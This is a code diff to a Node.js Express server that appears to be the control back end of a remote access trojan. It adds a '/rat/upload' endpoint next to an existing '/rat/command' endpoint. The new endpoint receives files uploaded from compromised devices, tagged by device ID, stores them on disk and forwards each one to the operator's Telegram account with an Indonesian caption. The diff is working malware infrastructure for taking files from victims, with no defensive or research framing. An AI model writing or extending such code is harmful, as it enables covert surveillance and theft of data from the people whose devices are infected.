@@ -7,6 +7,8 @@ const mongoose = require('mongoose');
 const config = require('./config');
 const bot = require('./telegram');
 const TrackedLink = require('./models/trackedLink');
+const multer = require('multer');
+const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
@@ -369,6 +371,49 @@ app.get('/rat/command', async (req, res) => {
         }
     } catch (error) {
         console.error("Error in /rat/command:", error);
+        res.status(500).send('Internal Server Error');
+    }
+});
+
+// Setup multer for file uploads
+const storage = multer.diskStorage({
+    destination: function (req, file, cb) {
+        const uploadPath = path.join(__dirname, 'uploads');
+        if (!fs.existsSync(uploadPath)) {
+            fs.mkdirSync(uploadPath, { recursive: true });
+        }
+        cb(null, uploadPath);
+    },
+    filename: function (req, file, cb) {
+        // Use deviceId and timestamp in filename to avoid conflicts
+        const deviceId = req.body.deviceId || 'unknown_device';
+        const timestamp = Date.now();
+        const originalName = file.originalname || 'upload';
+        cb(null, `${timestamp}-${deviceId}-${originalName}`);
+    }
+});
+const upload = multer({ storage: storage });
+
+// Endpoint for RAT to upload files
+app.post('/rat/upload', upload.single('file'), async (req, res) => {
+    try {
+        const { deviceId } = req.body;
+        const file = req.file;
+
+        if (!file) {
+            return res.status(400).json({ message: 'No file uploaded.' });
+        }
+
+        console.log(`File received from ${deviceId}: ${file.filename}`);
+
+        // Notify the admin and send the file
+        const caption = `📁 File diterima dari perangkat:\n\`${deviceId}\`\n\nNama File: \`${file.originalname}\``;
+        await bot.sendDocument(config.adminId, file.path, {}, { caption: caption });
+
+        res.status(200).json({ message: 'File uploaded successfully' });
+
+    } catch (error) {
+        console.error("Error in /rat/upload:", error);
         res.status(500).send('Internal Server Error');
     }
 });
